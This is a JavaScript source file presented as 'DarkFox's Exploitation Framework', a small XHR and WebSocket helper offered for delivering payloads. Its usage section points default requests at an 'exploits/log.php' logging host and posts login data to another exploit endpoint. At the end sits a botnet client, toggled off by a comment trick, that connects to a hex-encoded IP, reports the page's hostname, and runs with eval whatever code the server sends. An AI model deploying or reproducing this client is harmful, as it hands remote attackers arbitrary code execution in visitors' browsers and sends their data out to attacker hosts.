/* DarkFox's Exploitation Framework.
 * 
 * This library exists to aid the following goals.
 *
 * - Dynamically manage payloads through different communication methods.
 * - Be easy and simple to remove what you don't use.
 * - Let the code flow in a way that you don't need to keep referencing the same
 *   variable to manipulate and work with an object.
 * - Be very easy to extend.
 * 
 * The use examples include the following
 *
 * - POST and GET requests to send both objects and strings.
 * - A websocket adding events easier.
 * - A websocket powered botnet client.
 *
 * (C) DarkFox, 2013.
 *
 */

"use strict";

(function (s) {
    var $H;

    s.$H = $H = {
        protos: {
            d: function (d) {
                this.data = d;
                return this;
            },
            e: function () {
                this.addEventListener.apply(this, arguments);
                return this;
            },
            s: function (a) {
                if (this.method == "post")
                    this.send($H.encode(a || this.data));
                else
                    this.send();
                return this;
            }
        },
        encode: function (d) {
            if (typeof d == "string") return d + "=true";
            var x = [];
            for (var k in d)
                x.push(escape(k) + "=" + escape(d[k]));
            return x.join("&")
        },
        extend: function (a, b) {
            if (this.types([a, b], "object") && Object.keys(b).length > 0)
                for (var k in b)
                    a[k] = b[k].bind(a);
            return a;
        },
        types: function (a, b) {
            return a.every(function (a) {
                return typeof a == b
            });
        }
    };

    s.df = {
        conf: {},
        xhr: function (m, a, d, s) {
            var x = new XMLHttpRequest || ActiveXObject("Microsoft.XMLHTTP"),
                m = x.method = m || "get",
                a =            a || this.conf[m + "Addr"] || "./",
                d = x.data   = d || {},
                s = typeof s == "boolean" ? s : true;
            x.open(m,
                   a + (m == "get" && typeof d == "object"
                       ? "?" + $H.encode(d) : ""),
                   1);
            m.toLowerCase() == "post" &&
                x.setRequestHeader("Content-type",
                                   "application/x-www-form-urlencoded");
            $H.extend(x, $H.protos);
            s && x.s();
            return x;
        },
        get: function () {
            return this.xhr.bind(this, "get") .apply(this, arguments);
        },
        post: function () {
            return this.xhr.bind(this, "post").apply(this, arguments);
        },
        ws: function (a) {
            var ws = new WebSocket(a || this.conf.wsAddr || "./");
            $H.extend(ws, $H.protos);
            return ws;
        }
    }
})(window)
typeof DF_AUTORUN == "function" && DF_AUTORUN()

// Configure our addresses to reach for our default get and post requests.
df.conf = { postAddr: "http://darkfox.hackerhaven.net/exploits/log.php"
          , getAddr:  "http://darkfox.hackerhaven.net/exploits/log.php"
          };

df.post(false, "ping");

// Make an attempt to login to a dummy form
df.post("http://darkfox.us.to/exploits/form.php",
        { username: "DarkNFoxy"
        , password: "dummyPassword"
        }, false)
    .e("load", function () {
        console.log(this.responseText);
    }).s();

// Interesting way to log to the console via tcp.
df.ws("wss://echo.websockets.org")
    .e("open",    function ( ) { this.s     ("test") })
    .e("message", function (e) { console.log(e.data) });

// A tiny botnet client.
/*/
df.ws("wss://0x45a4dbd0:6120")
    .e("open",    function ( ) { this.s(location.hostname) })
    .e("message", function (e) { this.s(eval(e.data))      });
/*/
console.log("Botnet controller deactivated");
//*/
